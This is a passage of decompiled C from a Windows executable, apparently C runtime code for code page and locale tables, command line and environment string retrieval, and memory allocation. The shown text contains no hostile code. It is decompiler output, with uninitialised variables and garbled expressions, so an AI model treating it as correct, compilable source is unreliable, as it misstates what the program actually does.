    int32_t v3; // bp-8, 0x40c8c0
    int32_t * v4 = (int32_t *)((int32_t)&v3 - 4);
    if (v1 == *v2) {
        // 0x40c8da
        int32_t v5; // 0x40c8c0
        *v4 = v5;
        return function_40bbdc((int32_t)&g266);
    }
    int32_t v6; // 0x40c8c0
    *v4 = *(int32_t *)v6;
    function_40bbdc((int32_t)&g266);
    int32_t v7 = v6 + 4; // 0x40c8d2
    while (v7 != *v2) {
        // 0x40c8ca
        *v4 = *(int32_t *)v7;
        function_40bbdc((int32_t)&g266);
        v7 += 4;
    }
    // 0x40c8da
    return function_40bbdc((int32_t)&g266);
}

// Address range: 0x40c8e5 - 0x40c91a
int32_t function_40c8e5(int32_t a1) {
    // 0x40c8e5
    int32_t v1; // 0x40c8e5
    int32_t v2; // 0x40c8e5
    int32_t v3; // 0x40c8e5
    int32_t result = function_40c91a(v1, v2, v3); // 0x40c8ee
    if (result == 0) {
        // 0x40c906
        int32_t v4; // 0x40c8e5
        int32_t * v5 = (int32_t *)(v4 + 4); // 0x40c906
        *(int32_t *)*v5 = a1;
        *v5 = *v5 + 4;
    } else {
        // 0x40c8f9
        function_40bbdc(a1);
    }
    // 0x40c914
    return result;
}

// Address range: 0x40c91a - 0x40c9a1
int32_t function_40c91a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40c91a
    int32_t v1; // 0x40c91a
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40c920
    int32_t v3 = *v2; // 0x40c920
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x40c923
    if (*v4 != v3) {
        // 0x40c99e
        return 0;
    }
    if (v1 == 0) {
        // 0x40c931
        *(int32_t *)v1 = function_40c4a1(4, 4);
        function_40bbdc(0);
        // 0x40c99e
        return 12;
    }
    int32_t v5 = v3 - v1; // 0x40c95c
    int32_t v6 = v5 / 4; // 0x40c95e
    if (v6 >= 0x7fffffff) {
        // 0x40c99e
        return 12;
    }
    int32_t v7 = function_40d2fc(v1, 2 * v6, 4); // 0x40c972
    int32_t result = 12; // 0x40c97c
    if (v7 != 0) {
        // 0x40c983
        *(int32_t *)v1 = v7;
        *v4 = v7 + (v5 & -4);
        *v2 = v7 + 8 * v6;
        result = 0;
    }
    // 0x40c993
    function_40bbdc(0);
    // 0x40c99e
    return result;
}

// Address range: 0x40c9a1 - 0x40c9ac
int32_t function_40c9a1(int32_t a1, int32_t * a2) {
    // 0x40c9a1
    return function_40c516((int32_t)&g266, (int32_t)&g266);
}

// Address range: 0x40c9ac - 0x40c9e3
int32_t function_40c9ac(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40c9ac
    function_406770(&g101, 8, (int32_t)&g266);
    int32_t v1; // 0x40c9ac
    function_40bfa7(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40c9c3
    *v2 = 0;
    function_40ca17();
    *v2 = -2;
    function_40c9e3();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c9db
    return result;
}

// Address range: 0x40c9e3 - 0x40c9ef
int32_t function_40c9e3(void) {
    // 0x40c9e3
    int32_t v1; // 0x40c9e3
    return function_40bfef(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40c9ef - 0x40ca17
int32_t function_40c9ef(int32_t a1, int32_t * a2) {
    int32_t v1 = a1; // bp-12, 0x40c9fd
    int32_t v2 = a1; // bp-16, 0x40ca00
    int32_t v3; // 0x40c9ef
    return function_40c9ac(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40ca17 - 0x40cadb
int32_t function_40ca17(void) {
    // 0x40ca17
    int32_t v1; // 0x40ca17
    int32_t * v2 = (int32_t *)(v1 + 72); // 0x40ca22
    g216 = *(int32_t *)(*v2 + 4);
    g217 = *(int32_t *)(*v2 + 8);
    g215 = *(int32_t *)(*v2 + 540);
    function_40d137(&g218, 12, *v2 + 12, 12);
    function_40d137(&g129, 257, *(int32_t *)329 + 24, 257);
    function_40d137(&g130, 256, *(int32_t *)328 + 281, 256);
    int32_t v3 = (int32_t)g133; // 0x40caaa
    *g133 = (int32_t)&g132;
    int32_t v4 = v3; // 0x40caae
    if (g133 == (int32_t *)1) {
        // 0x40cab0
        v4 = v3;
        if (g133 != &g131) {
            int32_t v5 = (int32_t)g133; // 0x40cab0
            function_40bbdc(v5);
            v4 = v5;
        }
    }
    int32_t * v6 = (int32_t *)(v4 + 72); // 0x40cac7
    *(int32_t *)&g133 = *v6;
    int32_t result = *v6; // 0x40cad3
    int32_t * v7 = (int32_t *)result; // 0x40cad6
    *v7 = *v7 + 1;
    return result;
}

// Address range: 0x40cadb - 0x40cb19
int32_t function_40cadb(int32_t a1) {
    int32_t result = (int32_t)L"ja-JP"; // 0x40cadb
    switch (a1) {
        case 936: {
            // 0x40caf9
            return (int32_t)L"zh-CN";
        }
        default: {
            int32_t v1 = a1 - 949; // 0x40caef
            result = (int32_t)L"ko-KR";
            if (v1 != 0) {
                // 0x40caf4
                result = v1 == 1 ? (int32_t)L"zh-TW" : 0;
            }
        }
        case 932: {
            // 0x40caf9
            return result;
        }
    }
}

// Address range: 0x40cb19 - 0x40cb8c
int32_t function_40cb19(int32_t a1) {
    // 0x40cb19
    function_4093d4(0, (int32_t)&g266);
    g219 = 0;
    int32_t result; // 0x40cb19
    if (a1 != -2) {
        if (a1 != -3) {
            // 0x40cb63
            result = a1;
            if (a1 == -4) {
                // 0x40cb68
                g219 = 1;
                int32_t v1; // 0x40cb19
                result = *(int32_t *)(v1 + 8);
            }
        } else {
            // 0x40cb51
            g219 = 1;
            result = GetACP();
        }
    } else {
        // 0x40cb3a
        g219 = 1;
        result = GetOEMCP();
    }
    // 0x40cb78
    char v2; // 0x40cb19
    if (v2 != 0) {
        // 0x40cb7e
        int32_t v3; // 0x40cb19
        int32_t * v4 = (int32_t *)(v3 + 848); // 0x40cb81
        *v4 = *v4 & -3;
    }
    // 0x40cb88
    return result;
}

// Address range: 0x40cb8c - 0x40cbf1
int32_t function_40cb8c(int32_t a1) {
    int32_t v1 = a1 + 24; // 0x40cb9e
    function_4071b0((int32_t *)v1, 0, 257);
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)(a1 + 8) = 0;
    *(int32_t *)(a1 + 540) = 0;
    int32_t v2 = a1 + 12; // 0x40cbbe
    *(int32_t *)v2 = 0;
    bool v3; // 0x40cb8c
    int32_t v4 = v3 ? -4 : 4; // 0x40cbc1
    int32_t v5 = v4 + v2; // 0x40cbc1
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v4) = 0;
    int32_t v6 = (int32_t)&g131 - a1; // 0x40cbc9
    int32_t v7 = 257; // 0x40cbc9
    int32_t v8 = v1;
    *(char *)v8 = *(char *)(v8 + v6);
    v7--;
    int32_t v9 = v8 + 1; // 0x40cbd4
    while (v7 != 0) {
        // 0x40cbcb
        v8 = v9;
        *(char *)v8 = *(char *)(v8 + v6);
        v7--;
        v9 = v8 + 1;
    }
    int32_t result = 0; // 0x40cbdc
    int32_t v10 = a1 + 281; // 0x40cbdc
    int32_t v11 = 256; // 0x40cbdc
    unsigned char v12 = *(char *)(v10 + v6); // 0x40cbe1
    result = result & -256 | (int32_t)v12;
    *(char *)v10 = v12;
    v11--;
    v10++;
    while (v11 != 0) {
        // 0x40cbe1
        v12 = *(char *)(v10 + v6);
        result = result & -256 | (int32_t)v12;
        *(char *)v10 = v12;
        v11--;
        v10++;
    }
    // 0x40cbec
    return result;
}

// Address range: 0x40cbf1 - 0x40cd85
int32_t function_40cbf1(int32_t a1) {
    int32_t * CodePage = (int32_t *)(a1 + 4); // 0x40cc13
    int32_t v1; // 0x40cbf1
    int32_t v2; // 0x40cbf1
    int32_t lpCPInfo; // bp-1820, 0x40cbf1
    if (!GetCPInfo(*CodePage, (struct _cpinfo *)&lpCPInfo)) {
        int32_t v3 = a1 + 25;
        v1 = 0;
        while (true) {
          lab_0x40cd2e:
            // 0x40cd2e
            v2 = v1;
            int32_t v4 = a1 + 281 + v2; // 0x40cd2e
            if (v2 < 91) {
                char * v5 = (char *)(v2 + v3); // 0x40cd40
                *v5 = *v5 | 16;
                // 0x40cd5d
                *(char *)v4 = (char)(v2 + 32);
                goto lab_0x40cd63;
            } else {
                if (v2 < 123) {
                    char * v6 = (char *)(v2 + v3); // 0x40cd56
                    *v6 = *v6 | 32;
                    // 0x40cd5d
                    *(char *)v4 = (char)(v2 - 32);
                    goto lab_0x40cd63;
                } else {
                    // 0x40cd61
                    *(char *)v4 = 0;
                    goto lab_0x40cd63;
                }
            }
        }
      lab_0x40cd74_2:
        // 0x40cd74
        return function_4065ae();
    }
    // 0x40cc2d
    int32_t v7; // bp-4, 0x40cbf1
    int32_t v8 = &v7; // 0x40cbf4
    int32_t v9 = v8 - 260; // 0x40cc2d
    int32_t v10 = 0;
    *(char *)(v10 + v9) = (char)v10;
    int32_t v11 = v10 + 1; // 0x40cc34
    while (v11 != 256) {
        // 0x40cc2d
        v10 = v11;
        *(char *)(v10 + v9) = (char)v10;
        v11 = v10 + 1;
    }
    char v12 = 32; // bp-264, 0x40cc45
    char v13; // bp-1814, 0x40cbf1
    if (v13 != 0) {
        int32_t v14 = &v13; // 0x40cc68
        uint32_t v15 = (int32_t)*(char *)(v14 + 1); // 0x40cc4e
        int32_t v16 = ((int32_t)v13 | 256) & 255; // 0x40cc52
        int32_t v17 = v16; // 0x40cc66
        uint32_t v18; // 0x40cbf1
        int32_t v19; // 0x40cc63
        if (v16 <= v15) {
            v18 = v17;
            *(char *)(v18 + v9) = 32;
            v19 = v18 + 1;
            while (v18 < v15 && v19 < 256) {
                // 0x40cc5b
                v18 = v19;
                *(char *)(v18 + v9) = 32;
                v19 = v18 + 1;
            }
        }
        // 0x40cc68
        v14 += 2;
        unsigned char v20 = *(char *)v14; // 0x40cc6b
        while (v20 != 0) {
            // 0x40cc4e
            v15 = (int32_t)*(char *)(v14 + 1);
            v16 = (int32_t)v20 & 255;
            v17 = v16;
            if (v16 <= v15) {
                v18 = v17;
                *(char *)(v18 + v9) = 32;
                v19 = v18 + 1;
                while (v18 < v15 && v19 < 256) {
                    // 0x40cc5b
                    v18 = v19;
                    *(char *)(v18 + v9) = 32;
                    v19 = v18 + 1;
                }
            }
            // 0x40cc68
            v14 += 2;
            v20 = *(char *)v14;
        }
    }
    // 0x40cc71
    int32_t v21; // bp-1800, 0x40cbf1
    function_40dcbd(0, 1, &v12, 256, &v21, *CodePage, 0);
    int32_t * v22 = (int32_t *)(a1 + 540); // 0x40cca1
    int32_t v23; // bp-520, 0x40cbf1
    function_40eb68(0, *v22, 256, &v12, 256, &v23, 256, *CodePage, 0);
    int32_t v24; // bp-776, 0x40cbf1
    function_40eb68(0, *v22, 512, &v12, 256, &v24, 256, *CodePage, 0);
    int32_t v25 = a1 + 25;
    int32_t v26 = a1 + 281;
    int32_t v27 = 0; // 0x40ccd8
    int32_t v28; // 0x40cbf1
    int32_t v29; // 0x40cbf1
    while (true) {
      lab_0x40ccda:
        // 0x40ccda
        v28 = v27;
        int16_t v30 = *(int16_t *)(v8 - 1796 + 2 * v28); // 0x40ccda
        if ((v30 & 1) == 0) {
            if ((v30 & 2) == 0) {
                // 0x40cd0d
                *(char *)(v26 + v28) = 0;
                goto lab_0x40cd14;
            } else {
                char * v31 = (char *)(v28 + v25); // 0x40ccf8
                *v31 = *v31 | 32;
                v29 = v28 + v8 - 772;
                goto lab_0x40cd04;
            }
        } else {
            char * v32 = (char *)(v28 + v25); // 0x40cce6
            *v32 = *v32 | 16;
            v29 = v28 + v8 - 516;
            goto lab_0x40cd04;
        }
    }
  lab_0x40cd63:;
    int32_t v33 = v2 + 1; // 0x40cd6f
    v1 = v33;
    if (v33 == 256) {
        return function_4065ae();
    }
    goto lab_0x40cd2e;
  lab_0x40cd04:
    // 0x40cd04
    *(char *)(v26 + v28) = *(char *)v29;
    goto lab_0x40cd14;
  lab_0x40cd14:
    // 0x40cd14
    v27 = v28 + 1;
    if (v27 == 256) {
        // break -> 0x40cd74
        goto lab_0x40cd74_2;
    }
    goto lab_0x40ccda;
}

// Address range: 0x40cd85 - 0x40ce86
int32_t function_40cd85(int32_t a1, int32_t a2) {
    int32_t v1 = function_40ba33();
    int32_t v2 = v1; // bp-8, 0x40cd92
    function_40cea4(v1);
    int32_t v3 = function_40cb19(a1); // 0x40cd9d
    int32_t v4 = v3; // bp-16, 0x40cda6
    int32_t * v5 = (int32_t *)(v1 + 72);
    if (v3 == *(int32_t *)(*v5 + 4)) {
        // 0x40ce08
        return 0;
    }
    int32_t v6 = function_40bc16(544); // 0x40cdbd
    int32_t result = -1; // 0x40cdca
    int32_t v7 = 0; // 0x40cdca
    if (v6 != 0) {
        // 0x40cdcc
        __asm_rep_movsd_memcpy((char *)v6, (char *)*v5, 136);
        int32_t * v8 = (int32_t *)v6; // 0x40cddf
        *v8 = 0;
        int32_t v9 = function_40cf46(v3, v6); // 0x40cde2
        if (v9 != -1) {
            if ((char)a2 == 0) {
                // 0x40ce12
                function_40a797();
            }
            int32_t * v10 = (int32_t *)*(int32_t *)(v2 + 72); // 0x40ce1d
            int32_t v11 = *v10; // 0x40ce1d
            *v10 = v11 - 1;
            if (v11 == 1) {
                int32_t v12 = *(int32_t *)(v2 + 72); // 0x40ce27
                if (v12 != (int32_t)&g131) {
                    // 0x40ce30
                    function_40bbdc(v12);
                }
            }
            // 0x40ce39
            *v8 = 1;
            *(int32_t *)(v2 + 72) = v6;
            result = v9;
            v7 = 0;
            if ((*(char *)(v2 + 848) & 2) == 0) {
                // 0x40ce55
                result = v9;
                v7 = 0;
                if ((g139 & 1) == 0) {
                    // 0x40ce5e
                    v4 = &v2;
                    function_40c9ef(5, &v4);
                    result = v9;
                    v7 = 0;
                    if ((char)a2 != 0) {
                        // 0x40ce77
                        *(int32_t *)&g123 = (int32_t)g133;
                        result = v9;
                        v7 = 0;
                    }
                }
            }
        } else {
            // 0x40cdef
            *(int32_t *)function_40ab11() = 22;
            result = -1;
            v7 = v6;
        }
    }
    // 0x40cdfc
    int32_t v13; // bp-28, 0x40cd85
    *(int32_t *)((int32_t)&v13 - 4) = v7;
    function_40bbdc((int32_t)&g266);
    // 0x40ce08
    return result;
}

// Address range: 0x40ce86 - 0x40cea4
int32_t function_40ce86(void) {
    // 0x40ce86
    int32_t v1; // 0x40ce86
    if (g220 == 0) {
        int32_t v2 = function_40cd85(-3, 1); // 0x40ce93
        g220 = 1;
        v1 = v2;
    }
    // 0x40cea1
    return v1 & -256 | 1;
}

// Address range: 0x40cea4 - 0x40cf46
int32_t function_40cea4(int32_t a1) {
    // 0x40cea4
    function_406770(&g100, 12, (int32_t)&g266);
    int32_t v1; // 0x40cea4
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40ceb2
    *v2 = 0;
    int32_t v3 = function_40ba33(); // 0x40ceb5
    int32_t v4; // 0x40cea4
    if ((*(int32_t *)(v3 + 848) & (int32_t)g139) == 0) {
        goto lab_0x40cedb;
    } else {
        // 0x40ceca
        if (*(int32_t *)(v3 + 76) == 0) {
            goto lab_0x40cedb;
        } else {
            // 0x40cecf
            v4 = *(int32_t *)(v3 + 72);
            goto lab_0x40ced2;
        }
    }
  lab_0x40cedb:
    // 0x40cedb
    function_40bfa7(5);
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x40cee3
    *v5 = 0;
    int32_t * v6 = (int32_t *)(v3 + 72); // 0x40cee6
    int32_t v7 = *v6; // 0x40cee6
    *v2 = v7;
    int32_t v8 = v7; // 0x40cef2
    if (v7 != (int32_t)g133) {
        if (v7 != 0) {
            int32_t * v9 = (int32_t *)v7; // 0x40cefb
            int32_t v10 = *v9 - 1; // 0x40cefb
            *v9 = v10;
            if (v7 != (int32_t)&g131 && v10 == 0) {
                // 0x40cf09
                function_40bbdc(v7);
            }
        }
        // 0x40cf10
        *v6 = (int32_t)g133;
        int32_t v11 = (int32_t)g133; // 0x40cf18
        *v2 = v11;
        *g133 = (int32_t)"dB";
        v8 = v11;
    }
    // 0x40cf24
    *v5 = -2;
    function_40cf35();
    v4 = v8;
    goto lab_0x40ced2;
  lab_0x40ced2:
    // 0x40ced2
    if (v4 != 0) {
        int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40cf40
        return result;
    }
    // 0x40ced6
    function_40a98b();
    // UNREACHABLE
}

// Address range: 0x40cf35 - 0x40cf3e
int32_t function_40cf35(void) {
    // 0x40cf35
    return function_40bfef(5);
}

// Address range: 0x40cf46 - 0x40d137
int32_t function_40cf46(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-48, 0x40cf5a
    int32_t CodePage = function_40cb19(a1); // 0x40cf60
    if (CodePage == 0) {
        // 0x40cf6c
        v1 = a2;
        function_40cb8c(a2);
        // 0x40d127
        return function_4065ae();
    }
    int32_t v2 = 0; // 0x40cf8a
    int32_t v3 = 0; // 0x40cf8a
    int32_t v4; // bp-60, 0x40cf46
    if (g126 == CodePage) {
        goto lab_0x40d07a;
      lab_0x40d07a:;
        int32_t v5 = a2 + 24; // 0x40d07f
        v4 = v5;
        function_4071b0((int32_t *)v5, 0, 257);
        int32_t v6 = 0;
        int32_t v7 = v3 + (int32_t)&g128;
        char v8 = *(char *)v7; // 0x40d09c
        unsigned char v9; // 0x40d0aa
        int32_t v10; // 0x40cf46
        uint32_t v11; // 0x40cf46
        char * v12; // 0x40cf46
        char * v13; // 0x40d0a3
        unsigned char v14; // 0x40d0a3
        int32_t v15; // 0x40d0cd
        char v16; // 0x40d0d0
        char * v17; // 0x40d0c0
        int32_t v18; // 0x40d0c4
        if (v8 != 0) {
            // 0x40d0a3
            v12 = (char *)(v6 + (int32_t)&g125);
            v16 = v8;
            v10 = v7;
            v13 = (char *)(v10 + 1);
            v14 = *v13;
            while (v14 != 0) {
                // 0x40d0aa
                v9 = v16;
                if (v9 <= v14) {
                    // 0x40d0ba
                    v11 = (int32_t)v9;
                    v17 = (char *)(a2 + 25 + v11);
                    *v17 = *v17 | *v12;
                    v18 = v11 + 1;
                    while (!((v18 >= 256 | v11 >= (int32_t)*v13))) {
                        // 0x40d0ba
                        v11 = v18;
                        v17 = (char *)(a2 + 25 + v11);
                        *v17 = *v17 | *v12;
                        v18 = v11 + 1;
                    }
                }
                // 0x40d0cd
                v15 = v10 + 2;
                v16 = *(char *)v15;
                if (v16 == 0) {
                    // break -> 0x40d0d8
                    break;
                }
                v10 = v15;
                v13 = (char *)(v10 + 1);
                v14 = *v13;
            }
        }
        int32_t v19 = v6 + 1; // 0x40d0d8
        int32_t v20 = v7 + 8; // 0x40d0e2
        while (v19 != 4) {
            // 0x40d09c
            v6 = v19;
            v7 = v20;
            v8 = *(char *)v7;
            if (v8 != 0) {
                // 0x40d0a3
                v12 = (char *)(v6 + (int32_t)&g125);
                v16 = v8;
                v10 = v7;
                v13 = (char *)(v10 + 1);
                v14 = *v13;
                while (v14 != 0) {
                    // 0x40d0aa
                    v9 = v16;
                    if (v9 <= v14) {
                        // 0x40d0ba
                        v11 = (int32_t)v9;
                        v17 = (char *)(a2 + 25 + v11);
                        *v17 = *v17 | *v12;
                        v18 = v11 + 1;
                        while (!((v18 >= 256 | v11 >= (int32_t)*v13))) {
                            // 0x40d0ba
                            v11 = v18;
                            v17 = (char *)(a2 + 25 + v11);
                            *v17 = *v17 | *v12;
                            v18 = v11 + 1;
                        }
                    }
                    // 0x40d0cd
                    v15 = v10 + 2;
                    v16 = *(char *)v15;
                    if (v16 == 0) {
                        // break -> 0x40d0d8
                        break;
                    }
                    v10 = v15;
                    v13 = (char *)(v10 + 1);
                    v14 = *v13;
                }
            }
            // 0x40d0d8
            v19 = v6 + 1;
            v20 = v7 + 8;
        }
        // 0x40d0e4
        *(int32_t *)(a2 + 4) = CodePage;
        *(int32_t *)(a2 + 8) = 1;
        *(int32_t *)(a2 + 540) = function_40cadb(CodePage);
        int32_t v21 = a2 + 12; // 0x40d10b
        int32_t v22 = v3 + (int32_t)&g127; // 0x40d10b
        *(int16_t *)v21 = *(int16_t *)v22;
        int32_t v23 = 5; // 0x40d118
        v21 += 2;
        v22 += 2;
        int32_t v24 = v23; // 0x40d11b
        while (v23 != 0) {
            // 0x40d10c
            *(int16_t *)v21 = *(int16_t *)v22;
            v23 = v24 - 1;
            v21 += 2;
            v22 += 2;
            v24 = v23;
        }
        // 0x40d11d
        *(int32_t *)((int32_t)&v1 - 4) = a2;
        function_40cbf1((int32_t)&g266);
        // 0x40d127
        return function_4065ae();
    }
    int32_t v25 = 0;
    int32_t v26 = v25 + 48; // 0x40cf91
    while (v26 < 240) {
        // 0x40cf84
        v2++;
        if (*(int32_t *)(v25 + (int32_t)&g126 + 48) == CodePage) {
            // 0x40cf84
            v3 = 48 * v2;
            goto lab_0x40d07a;
        }
        v25 = v26;
        v26 = v25 + 48;
    }
    if ((CodePage || 1) == 0xfde9 || !IsValidCodePage(CodePage & 0xffff)) {
        // 0x40d127
        return function_4065ae();
    }
    // 0x40cfc8
    v4 = CodePage;
    int32_t lpCPInfo; // bp-28, 0x40cf46
    if (!GetCPInfo(CodePage, (struct _cpinfo *)&lpCPInfo)) {
        // 0x40d05f
        if (g219 != 0) {
            // 0x40d067
            function_40cb8c(a2);
        }
        // 0x40d127
        return function_4065ae();
    }
    // 0x40cfdb
    function_4071b0((int32_t *)(a2 + 24), 0, 257);
    int32_t * v27 = (int32_t *)(a2 + 4); // 0x40cfea
    *v27 = CodePage;
    int32_t * v28 = (int32_t *)(a2 + 540); // 0x40cff2
    *v28 = 0;
    if (lpCPInfo < 2) {
        // 0x40d04f
        *(int32_t *)(a2 + 8) = 0;
    } else {
        char v29; // 0x40cf46
        if (v29 != 0) {
            // 0x40d007
            char v30; // bp-22, 0x40cf46
            int32_t v31 = &v30; // 0x40d020
            unsigned char v32 = *(char *)(v31 + 1); // 0x40d007
            while (v32 != 0) {
                unsigned char v33 = *(char *)v31; // 0x40d011
                if (v33 <= v32) {
                    int32_t v34 = v33;
                    char * v35 = (char *)(a2 + 25 + v34); // 0x40d016
                    *v35 = *v35 | 4;
                    int32_t v36 = v34 + 1; // 0x40d01e
                    while (v34 != (int32_t)v32) {
                        // 0x40d016
                        v34 = v36;
                        v35 = (char *)(a2 + 25 + v34);
                        *v35 = *v35 | 4;
                        v36 = v34 + 1;
                    }
                }
                // 0x40d020
                v31 += 2;
                if (*(char *)v31 == 0) {
                    // break -> 0x40d028
                    break;
                }
                v32 = *(char *)(v31 + 1);
            }
        }
        int32_t v37 = a2 + 26; // 0x40d02b
        int32_t v38 = 254; // 0x40d02b
        char * v39 = (char *)v37; // 0x40d030
        *v39 = *v39 | 8;
        v38--;
        v37++;
        while (v38 != 0) {
            // 0x40d030
            v39 = (char *)v37;
            *v39 = *v39 | 8;
            v38--;
            v37++;
        }
        // 0x40d039
        *v28 = function_40cadb(*v27);
        *(int32_t *)(a2 + 8) = 1;
    }
    int32_t v40 = a2 + 12; // 0x40d054
    *(int32_t *)v40 = 0;
    bool v41; // 0x40cf46
    int32_t v42 = v41 ? -4 : 4; // 0x40d057
    int32_t v43 = v42 + v40; // 0x40d057
    *(int32_t *)v43 = 0;
    *(int32_t *)(v43 + v42) = 0;
    // 0x40d11d
    *(int32_t *)((int32_t)&v4 - 4) = a2;
    function_40cbf1((int32_t)&g266);
    // 0x40d127
    return function_4065ae();
}

// Address range: 0x40d137 - 0x40d1b8
int32_t function_40d137(int32_t * a1, uint32_t a2, int32_t a3, uint32_t a4) {
    // 0x40d137
    if (a4 == 0) {
        // 0x40d1b5
        return 0;
    }
    if (a1 == NULL) {
        // 0x40d14f
        *(int32_t *)function_40ab11() = 22;
        // 0x40d1b5
        return 22;
    }
    if (a3 != 0 && a2 >= a4) {
        // 0x40d16f
        function_408e60((int32_t)a1, a3, a4);
        // 0x40d1b5
        return 0;
    }
    // 0x40d17e
    function_4071b0(a1, 0, a2);
    int32_t v1; // 0x40d137
    int32_t result; // 0x40d137
    if (a3 != 0) {
        // 0x40d199
        if (a2 >= a4) {
            // 0x40d1b5
            return 22;
        }
        // 0x40d19e
        v1 = function_40ab11();
        result = 34;
    } else {
        // 0x40d190
        v1 = function_40ab11();
        result = 22;
    }
    // 0x40d1a5
    *(int32_t *)v1 = result;
    // 0x40d1b5
    return result;
}

// Address range: 0x40d1b8 - 0x40d211
int32_t function_40d1b8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40d1b8
    int32_t v1; // 0x40d1b8
    function_4093d4(a1, v1);
    int32_t v2 = a2 & 255; // 0x40d1cc
    int32_t result; // 0x40d1b8
    int32_t v3; // 0x40d1b8
    if ((*(char *)(v2 + 25 + v3) & (char)a4) != 0) {
        // 0x40d1f7
        result = 1;
        goto lab_0x40d1fa;
    } else {
        // 0x40d1dc
        result = 0;
        if (a3 == 0) {
            goto lab_0x40d1fa;
        } else {
            // 0x40d1e3
            result = 0;
            int32_t v4; // 0x40d1b8
            if (((int32_t)*(int16_t *)(*(int32_t *)v4 + 2 * v2) & a3) == 0) {
                goto lab_0x40d1fa;
            } else {
                // 0x40d1f7
                result = 1;
                goto lab_0x40d1fa;
            }
        }
    }
  lab_0x40d1fa:;
    // 0x40d1fa
    char v5; // 0x40d1b8
    if (v5 != 0) {
        // 0x40d201
        int32_t v6; // 0x40d1b8
        int32_t * v7 = (int32_t *)(v6 + 848); // 0x40d204
        *v7 = *v7 & -3;
    }
    // 0x40d20b
    return result;
}

// Address range: 0x40d211 - 0x40d229
int32_t function_40d211(int32_t a1) {
    // 0x40d211
    int32_t v1; // 0x40d211
    return function_40d1b8(0, a1, 0, 4, v1);
}

// Address range: 0x40d229 - 0x40d242
int32_t function_40d229(void) {
    // 0x40d229
    g224 = GetCommandLineA();
    int32_t v1 = (int32_t)GetCommandLineW(); // 0x40d234
    g225 = v1;
    return v1 & -256 | 1;
}

// Address range: 0x40d242 - 0x40d279
int32_t function_40d242(int32_t a1) {
    // 0x40d242
    if (*(int16_t *)a1 == 0) {
        // 0x40d273
        return a1 + 2;
    }
    int32_t v1 = a1;
    int32_t v2 = v1;
    int32_t v3 = v2 + 2; // 0x40d25b
    while (*(int16_t *)v2 != 0) {
        // 0x40d258
        v2 = v3;
        v3 = v2 + 2;
    }
    int32_t v4 = v1 + 2 + (-2 - v1 + v3 & -2); // 0x40d26a
    while (*(int16_t *)v4 != 0) {
        // 0x40d253
        v1 = v4;
        v2 = v1;
        v3 = v2 + 2;
        while (*(int16_t *)v2 != 0) {
            // 0x40d258
            v2 = v3;
            v3 = v2 + 2;
        }
        // 0x40d263
        v4 = v1 + 2 + (-2 - v1 + v3 & -2);
    }
    // 0x40d273
    return v4 + 2;
}

// Address range: 0x40d279 - 0x40d2fc
int32_t function_40d279(void) {
    int16_t * lpWideCharStr = GetEnvironmentStringsW(); // 0x40d282
    if (lpWideCharStr == NULL) {
        // 0x40d2f3
        return 0;
    }
    int32_t v1 = (int32_t)lpWideCharStr; // 0x40d282
    int32_t cchWideChar = (function_40d242(v1) - v1) / 2; // 0x40d29f
    int32_t v2 = 0; // bp-52, 0x40d2a4
    int32_t v3 = &v2; // 0x40d2a4
    int32_t cbMultiByte = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, NULL, 0, NULL, NULL); // 0x40d2a5
    int32_t * v4; // 0x40d279
    int32_t v5; // 0x40d279
    int32_t result; // 0x40d279
    int32_t v6; // 0x40d279
    int32_t lpMultiByteStr; // 0x40d2b3
    int32_t v7; // 0x40d2ca
    if (cbMultiByte == 0) {
        // 0x40d290
        v4 = (int32_t *)(v3 - 4);
        result = 0;
        goto lab_0x40d2ec;
    } else {
        // 0x40d2b2
        lpMultiByteStr = function_40bc16(cbMultiByte);
        v7 = v3;
        if (lpMultiByteStr == 0) {
            goto lab_0x40d2db;
        } else {
            int32_t v8 = 0; // bp-84, 0x40d2ca
            v7 = &v8;
            int32_t v9 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, (char *)lpMultiByteStr, cbMultiByte, NULL, NULL); // 0x40d2cb
            v5 = lpMultiByteStr;
            v6 = 0;
            if (v9 == 0) {
                goto lab_0x40d2db;
            } else {
                goto lab_0x40d2dd;
            }
        }
    }
  lab_0x40d2ec:
    // 0x40d2ec
    *v4 = v1;
    FreeEnvironmentStringsW((int16_t *)&g266);
    // 0x40d2f3
    return result;
  lab_0x40d2db:
    // 0x40d2db
    v5 = 0;
    v6 = lpMultiByteStr;
    goto lab_0x40d2dd;
  lab_0x40d2dd:;
    int32_t * v10 = (int32_t *)(v7 - 4);
    *v10 = v6;
    function_40bbdc((int32_t)&g266);
    v4 = v10;
    result = v5;
    goto lab_0x40d2ec;
}

// Address range: 0x40d2fc - 0x40d374
int32_t function_40d2fc(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x40d2fc
    if (a2 != 0) {
        if (0xffffffe0 / a2 < a3) {
            // 0x40d320
            *(int32_t *)function_40ab11() = 12;
            // 0x40d371
            return 0;
        }
    }
    int32_t v1 = 0; // 0x40d336
    if (a1 != 0) {
        // 0x40d338
        int32_t v2; // 0x40d2fc
        int32_t v3; // 0x40d2fc
        int32_t v4; // 0x40d2fc
        int32_t v5; // 0x40d2fc
        v1 = function_40f2d3(a1, v2, v5, v3, v4);
    }
    uint32_t v6 = v1;
    uint32_t v7 = a3 * a2; // 0x40d345
    int32_t result = function_40f306(a1, v7); // 0x40d34b
    if (result != 0 && v7 > v6) {
        // 0x40d35c
        function_4071b0((int32_t *)(result + v6), 0, v7 - v6);
    }
    // 0x40d371
    return result;
}

